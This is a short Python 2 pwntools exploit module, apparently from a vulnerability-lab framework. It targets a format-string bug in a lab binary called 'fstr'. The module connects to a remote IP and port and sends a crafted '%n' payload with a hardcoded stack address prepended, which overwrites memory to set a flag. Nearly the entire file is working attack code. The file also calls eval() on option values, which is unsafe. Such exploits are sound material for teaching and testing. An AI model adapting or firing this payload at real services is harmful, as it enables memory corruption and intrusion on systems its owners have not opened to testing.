#! /usr/bin/python
#coding:utf-8
'''FormatStr'''

import sys
sys.path.append("..")
from pwn import *
sys.path.append(os.path.abspath("../.."))
from modules.script_tools import *
from modules import exploit

class Exploit(exploit.VRL_Exploit):
    
    def __init__(self):
        self.name = 'fstr'
        self.payload_info = 'DEP ON ASLR ON'
        self.info = '''Exploit Name : fstr
                       Exploit abstract :format string
                       Author : guoyingjie
                       Support change payload : false'''
        # read options from share
        self.options = {'dIP' :  get_share('dIP'),
                   'port' : get_share('port'),
                   'wait' : get_share('wait')}
        self.property = {
            'write_flag':'%010x%010x%010x%01970x%n'
            }
        self.vulnerability= 'vulnerabilities/fstr/fstr'

    def run(self):
        ip, port = self.options['dIP'], int(self.options['port'])
        p = remote(ip, port)

        #debug
        if eval(self.options['wait']):
               a= raw_input("You can attach now.\nPress Any Key to begin...")

        self.property['write_flag'] = '\x14\xdc\xff\xff\xff\x7f' + self.property['write_flag']
        p.sendline(self.property['write_flag'])
        
        #debug 0x7fffffffdc14
        if eval(self.options['wait']):
               a= raw_input("You can attach now.\nPress Any Key to begin...")

        # p.interactive()





if __name__=='__main__':
 
    if '__init__.py' not in os.listdir(os.curdir):
        os.mknod('__init__.py')
    exp = Exploit()
    print 'Exploit: ',exp.name,' \n'
    print 'Checking:\n'
    if exp.check():
        print 'Running:\n'
        exp.run()



